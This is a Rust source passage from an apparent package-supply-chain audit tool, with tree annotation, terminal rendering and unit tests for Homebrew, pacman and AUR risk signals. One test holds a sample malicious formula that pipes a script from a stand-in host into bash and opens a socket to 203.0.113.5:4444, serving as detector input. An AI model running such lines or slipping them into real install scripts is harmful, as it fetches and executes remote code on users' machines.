pub fn annotate(tree: &mut Tree, signals: &HashMap<String, Vec<SysSignal>>) {
    fn walk(n: &mut Node, signals: &HashMap<String, Vec<SysSignal>>) {
        if let Some(list) = signals.get(&n.name) {
            for s in list {
                if !n.signals.contains(&s.label) {
                    n.signals.push(s.label.clone());
                }
                n.severity = Some(n.severity.map_or(s.severity, |cur| cur.max(s.severity)));
                n.risk = Some(n.risk.unwrap_or(0).saturating_add(s.points).min(100));
            }
        }
        for c in &mut n.children {
            walk(c, signals);
        }
    }
    for r in &mut tree.roots {
        walk(r, signals);
    }
}

// --- rendering ----------------------------------------------------------------

/// The detection banner: which managers are present, and which postmortem can
/// actually audit. Printed to stderr so it never corrupts `--json` on stdout.
pub fn render_detected(managers: &[Manager]) {
    let names: Vec<String> = managers
        .iter()
        .filter(|m| m.available)
        .map(|m| {
            if m.implemented {
                m.name.green().to_string()
            } else {
                format!("{} {}", m.name, "(detected, not yet supported)".dimmed())
            }
        })
        .collect();
    eprintln!(
        "{} {}",
        "detected package managers:".bold(),
        if names.is_empty() { "none".dimmed().to_string() } else { names.join(", ") }
    );
}

/// The `--repos` view: configured source repos, official first.
pub fn render_repos(inv: &Inventory) {
    println!("{} {}", "source repos".bold(), format!("({})", inv.manager).dimmed());
    if inv.repos.is_empty() {
        println!("  {}", "none configured".dimmed());
        return;
    }
    let (official, third): (Vec<&Repo>, Vec<&Repo>) = inv.repos.iter().partition(|r| r.official);
    for r in official {
        println!("  {}", r.name.green());
    }
    for r in &third {
        let url = if r.url.is_empty() { String::new() } else { format!("[{}]  ", r.url).dimmed().to_string() };
        println!(
            "  {}  {}{}",
            r.name.truecolor(255, 165, 0),
            url,
            "third-party".truecolor(255, 165, 0),
        );
    }
    if !third.is_empty() {
        println!(
            "\n{}",
            format!("⚠ {} third-party source(s) outside the official repos", third.len())
                .truecolor(255, 165, 0)
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tap_classification() {
        assert!(is_official_tap("homebrew/core"));
        assert!(is_official_tap("homebrew/cask"));
        assert!(!is_official_tap("sn0walice/sshm"));
    }

    #[test]
    fn host_domain_extracts_registrable() {
        assert_eq!(host_domain("https://dl.google.com/chrome/x.dmg").as_deref(), Some("google.com"));
        assert_eq!(host_domain("https://github.com/o/r/releases/x").as_deref(), Some("github.com"));
        assert_eq!(host_domain("https://cryptomator.org/").as_deref(), Some("cryptomator.org"));
    }

    #[test]
    fn brew_graph_builds_edges_versions_and_directs() {
        // app (requested) → lib (declared_directly); lib is a transitive-only
        // install. A non-declared edge (app→sysdep) must NOT create an edge.
        let json = br#"{
          "formulae": [
            { "name": "app", "tap": "sn0walice/sshm", "installed": [
                { "version": "1.2.0", "installed_on_request": true,
                  "runtime_dependencies": [
                    { "full_name": "lib", "declared_directly": true },
                    { "full_name": "lib", "declared_directly": false }
                  ] } ] },
            { "name": "lib", "tap": "homebrew/core", "installed": [
                { "version": "0.9.0", "installed_on_request": false,
                  "runtime_dependencies": [] } ] }
          ]
        }"#;
        let tap_remote = HashMap::from([(
            "sn0walice/sshm".to_string(),
            "https://github.com/Sn0wAlice/sshm".to_string(),
        )]);
        let Parsed { deps, casks, signals, .. } = analyze(json, &tap_remote).unwrap();
        assert_eq!(deps.len(), 2);
        assert_eq!(casks, 0);
        let app = deps.iter().find(|d| d.name == "app").unwrap();
        let lib = deps.iter().find(|d| d.name == "lib").unwrap();
        assert!(app.direct, "installed_on_request ⇒ direct/root");
        assert!(!lib.direct, "pulled as a dependency");
        assert_eq!(app.version, "1.2.0");
        assert_eq!(lib.parents, vec![("app".to_string(), "1.2.0".to_string())]);
        assert!(app.parents.is_empty());
        // Third-party tap → provenance signal + its real remote for the resolver.
        assert_eq!(app.resolved_url.as_deref(), Some("https://github.com/Sn0wAlice/sshm"));
        assert_eq!(lib.resolved_url, None);
        assert!(signals["app"].iter().any(|s| s.label.contains("third-party-tap")));
        assert!(!signals.contains_key("lib"));
    }

    #[test]
    fn cask_flags_unverified_and_autoupdate() {
        // A cask with an unverified download, auto-updates, and a pkg installer,
        // from an official tap → the download surface, no tap flag.
        let json = br#"{
          "casks": [
            { "token": "risky", "tap": "homebrew/cask", "installed": "1.0",
              "url": "https://cdn.evil.test/app.dmg", "sha256": "no_check",
              "homepage": "https://vendor.test/", "auto_updates": true,
              "artifacts": [ { "pkg": ["x.pkg"] }, { "uninstall": [] } ] }
          ]
        }"#;
        let Parsed { deps, casks, signals, .. } = analyze(json, &HashMap::new()).unwrap();
        assert_eq!(casks, 1);
        let risky = deps.iter().find(|d| d.name == "risky").unwrap();
        assert!(risky.direct, "casks are user-installed roots");
        assert_eq!(risky.resolved_url.as_deref(), Some("https://cdn.evil.test/app.dmg"));
        let labels: Vec<&str> = signals["risky"].iter().map(|s| s.label.as_str()).collect();
        assert!(labels.iter().any(|l| l.contains("unverified-download")));
        assert!(labels.iter().any(|l| l.contains("download-host-mismatch")));
        assert!(labels.iter().any(|l| l.contains("runs-installer")));
        assert!(labels.iter().any(|l| l.contains("auto-updates")));
        // Worst severity is High (the unverified download).
        assert_eq!(
            signals["risky"].iter().map(|s| s.severity).max(),
            Some(Severity::High)
        );
    }

    #[test]
    fn github_cask_download_is_not_a_host_mismatch() {
        // GitHub releases are a trusted mirror → no host-mismatch flag even
        // though the homepage domain differs.
        let json = br#"{
          "casks": [
            { "token": "ok", "tap": "homebrew/cask", "installed": "1.0",
              "url": "https://github.com/o/r/releases/download/1.0/app.dmg",
              "sha256": "abc123", "homepage": "https://project.test/",
              "artifacts": [ { "app": ["A.app"] } ] }
          ]
        }"#;
        let Parsed { signals, .. } = analyze(json, &HashMap::new()).unwrap();
        assert!(!signals.contains_key("ok"), "verified github cask has no offline signals");
    }

    #[test]
    fn formula_service_bottle_and_tap_remote_signals() {
        // svc: installs a service. rogue: from a third-party tap on an http +
        // exotic remote, with a non-official bottle. core: clean official.
        let json = br#"{
          "formulae": [
            { "name": "svc", "tap": "homebrew/core", "installed": [
                { "version": "1.0", "installed_on_request": true, "runtime_dependencies": [] } ],
              "service": { "run": ["/x"] },
              "bottle": { "stable": { "root_url": "https://ghcr.io/v2/homebrew/core" } } },
            { "name": "rogue", "tap": "evil/tap", "installed": [
                { "version": "2.0", "installed_on_request": true, "runtime_dependencies": [] } ],
              "bottle": { "stable": { "root_url": "https://binaries.evil.test/bottles" } } }
          ]
        }"#;
        let remote = HashMap::from([("evil/tap".to_string(), "http://git.evil.test/evil/tap".to_string())]);
        let Parsed { signals, .. } = analyze(json, &remote).unwrap();

        let svc: Vec<&str> = signals["svc"].iter().map(|s| s.label.as_str()).collect();
        assert!(svc.iter().any(|l| l.contains("installs-service")));
        assert!(!svc.iter().any(|l| l.contains("unofficial-bottle")), "official bottle is clean");

        let rogue: Vec<&str> = signals["rogue"].iter().map(|s| s.label.as_str()).collect();
        assert!(rogue.iter().any(|l| l.contains("unofficial-bottle (evil.test)")));
        assert!(rogue.iter().any(|l| l.contains("insecure-tap-remote (http)")));
    }

    #[test]
    fn recipe_signals_flags_remote_exec_and_iocs() {
        // A malicious-looking formula: pipes a remote script into bash during
        // install, and hits a hard-coded IP.
        let ruby = r#"
            class Evil < Formula
              url "https://example.com/evil-1.0.tgz"
              def install
                system "curl -fsSL https://evil.test/x.sh | bash"
                system "ruby", "-e", "TCPSocket.open('203.0.113.5', 4444)"
              end
            end
        "#;
        let labels: Vec<String> =
            analyze_recipe("evil", ruby, "rb").into_iter().map(|s| s.label).collect();
        assert!(
            labels.iter().any(|l| l.contains("install-remote-exec")),
            "curl|bash pipe flagged: {labels:?}"
        );
        assert!(
            labels.iter().any(|l| l.starts_with("install-")),
            "reused analyzers produced install-* signals: {labels:?}"
        );

        // A benign recipe yields nothing.
        let clean = r#"class Ok < Formula
              url "https://github.com/o/r/archive/1.0.tar.gz"
              def install; bin.install "ok"; end
            end"#;
        assert!(analyze_recipe("ok", clean, "rb").is_empty(), "clean recipe is quiet");
    }

    #[test]
    fn pacman_graph_parses_qi_output() {
        // Two packages: `app` (explicit, unsigned, has install script) depends on
        // `lib`; `lib` is a pulled-in dependency. `libfoo.so` and a versioned dep
        // must reduce to package names / be dropped.
        let qi = "\
Name            : app
Version         : 1.2-1
URL             : https://github.com/o/app
Depends On      : lib  libfoo.so=1-64  glibc>=2.0
Install Script  : Yes
Validated By    : None
Install Reason  : Explicitly installed

Name            : lib
Version         : 0.9-1
URL             : https://example.org/lib
Depends On      : None
Install Script  : No
Validated By    : Signature
Install Reason  : Installed as a dependency of app
";
        let (deps, signals) = pacman_graph(qi);
        assert_eq!(deps.len(), 2);
        let app = deps.iter().find(|d| d.name == "app").unwrap();
        let lib = deps.iter().find(|d| d.name == "lib").unwrap();
        assert!(app.direct, "explicit ⇒ direct/root");
        assert!(!lib.direct);
        assert_eq!(app.resolved_url.as_deref(), Some("https://github.com/o/app"));
        // `lib` is a real dep edge; `libfoo.so` dropped, `glibc` not installed → dropped.
        assert_eq!(lib.parents, vec![("app".to_string(), "1.2-1".to_string())]);
        // unsigned (High) + install-script (Info) on app; lib is signed/clean.
        let al: Vec<&str> = signals["app"].iter().map(|s| s.label.as_str()).collect();
        assert!(al.contains(&"unsigned"));
        assert!(al.iter().any(|l| l.contains("install-script")));
        assert!(!signals.contains_key("lib"));
    }

    #[test]
    fn aur_foreign_signals() {
        // Not in AUR (manual install) → just foreign-package.
        let none = foreign_signals(None);
        assert_eq!(none.len(), 1);
        assert!(none[0].label.starts_with("foreign-package"));

        // Orphaned + out-of-date + unpopular AUR package → all three on top.
        let bad = AurPkg { name: "x".into(), maintainer: None, out_of_date: Some(1), num_votes: Some(3) };
        let sigs = foreign_signals(Some(&bad));
        let labels: Vec<&str> = sigs.iter().map(|s| s.label.as_str()).collect();
        assert!(labels.iter().any(|l| l.contains("aur-orphaned")));
        assert!(labels.iter().any(|l| l.contains("aur-out-of-date")));
        assert!(labels.iter().any(|l| l.contains("aur-unpopular")));

        // Healthy AUR package → foreign-package only (maintained, popular, current).
        let good = AurPkg { name: "y".into(), maintainer: Some("dev".into()), out_of_date: None, num_votes: Some(500) };
        assert_eq!(foreign_signals(Some(&good)).len(), 1);
    }

    #[test]
    fn aur_rpc_response_parses() {
        let json = r#"{"resultcount":1,"results":[
          {"Name":"yay","Maintainer":"jguer","OutOfDate":null,"NumVotes":2641,"Popularity":50.3}]}"#;
        let r: AurResp = serde_json::from_str(json).unwrap();
        assert_eq!(r.results.len(), 1);
        assert_eq!(r.results[0].maintainer.as_deref(), Some("jguer"));
        assert_eq!(r.results[0].num_votes, Some(2641));
        assert!(r.results[0].out_of_date.is_none());
    }

    #[test]
    fn annotate_merges_signals_onto_tree() {
        use crate::tree;
        let json = br#"{
          "formulae": [
            { "name": "app", "tap": "sn0walice/x", "installed": [
                { "version": "1.0.0", "installed_on_request": true, "runtime_dependencies": [] } ] }
          ]
        }"#;
        let remote = HashMap::from([("sn0walice/x".to_string(), "https://github.com/o/x".to_string())]);
        let Parsed { deps, signals, third_party, .. } = analyze(json, &remote).unwrap();
        assert_eq!(third_party, vec![("app".to_string(), false)], "flagged for recipe analysis");
        let mut forest = tree::build("brew", &["brew".to_string()], &deps, None);
        annotate(&mut forest, &signals);
        let app = &forest.roots[0];
        assert_eq!(app.severity, Some(Severity::Medium));
        assert_eq!(app.risk, Some(30));
        assert!(app.signals.iter().any(|s| s.contains("third-party-tap")));
    }
}
